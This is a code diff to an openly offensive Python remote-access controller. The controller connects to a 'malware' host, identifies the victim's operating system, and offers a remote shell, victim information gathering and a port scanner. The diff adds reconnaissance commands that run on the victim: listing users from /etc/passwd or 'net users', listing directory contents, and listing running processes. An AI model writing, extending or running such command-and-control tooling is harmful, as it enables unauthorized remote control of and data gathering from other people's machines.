@@ -3,6 +3,7 @@ from scapy.all import *
 import socket
 import argparse
 
+
 class Shell:
 
     def __init__(self):
@@ -47,12 +48,29 @@ class GetInfo:
     def __init__(self, malware_os):
         self._os = malware_os
 
+    # List users
     def get_users(self):
         if self._os == "Windows":
             return "net users"
         elif self._os == "Linux":
             return "cut -d: -f1 /etc/passwd"
 
+    # list directory content
+    def get_content(self):
+        if self._os == "Windows":
+            return "dir"
+        elif self._os == "Linux":
+            return "ls"
+
+
+    # list running Process
+    def list_process(self):
+        if self._os == "Windows":
+            return "tasklist /FI \"STATUS eq running\""
+        elif self._os == "Linux":
+            return "ps -A"
+
+    # Make a screenshot
     def screenshot(self):
         pass
 
@@ -60,9 +78,13 @@ class GetInfo:
 class PortScanner:
 
     def scanner(self):
+
         address = input("[*] Enter the address to scan: ")
+        print("[*] To enter a range give the minimum and maximum port number. To scan a specific port enter twice the "
+              "same number.")
         min_port = input("[*] Enter de minimum port number: ")
         max_port = input("[*] Enter the Maximum port Number: ")
+
         print("\033[32m[*] Scan started!\033[0m\n")
         t1 = datetime.now()
         for port in range(int(min_port), int(max_port) + 1):
@@ -73,6 +95,7 @@ class PortScanner:
         t2 = datetime.now()
         final_time = t2 - t1
         print("\n\033[32m[*] Scan finished!\033[0m")
+
         print("\033[32m[*] Scanning completed in {}\033[0m".format(final_time))
 
 
@@ -92,7 +115,7 @@ try:
     s.connect(serv_addr)
 except socket.error:
     print("\033[31m[!] Unable to connect to the following address: {}\033[0m".format(malware_addr))
-    sys.exit(1)
+    sys.exit(0)
 print(s.recv(4096).decode('utf-8'))
 s.send("os".encode("utf-8"))
 malware_os = s.recv(4096).decode('utf-8')
@@ -100,9 +123,10 @@ malware_os = s.recv(4096).decode('utf-8')
 getinfo = GetInfo(malware_os)
 shell = Shell()
 
-print("\n----------------------")
+print("----------------------")
 message = input(
-    "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start the PortScanner.\n4. Type exit to quit\n\nAnswer: ")
+    "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start the "
+    "PortScanner.\n4. Type exit to quit\n\nAnswer: ")
 print("\n----------------------")
 
 while message != "exit":
@@ -120,16 +144,30 @@ while message != "exit":
                 shell.send()
                 shell.receive()
     elif message == "2":
+        print("\033[32m[*] List of Users\033[0m")
         shell.set_command(getinfo.get_users())
         shell.send()
         shell.receive()
+        print("----------------------")
+        print("\033[32m[*] Directory Content\033[0m")
+        shell.set_command(getinfo.get_content())
+        shell.send()
+        shell.receive()
+        print("----------------------")
+        print("\033[32m[*] list Running Process\033[0m")
+        shell.set_command(getinfo.list_process())
+        shell.send()
+        shell.receive()
+
+
     elif message == "3":
         scan = PortScanner()
         scan.scanner()
 
     print("\n----------------------")
     message = input(
-        "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start the PortScanner.\n4.Type exit to quit\n\nAnswer: ")
+        "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start the "
+        "PortScanner.\n4. Type exit to quit\n\nAnswer: ")
 print("\n----------------------")
 
 s.close()
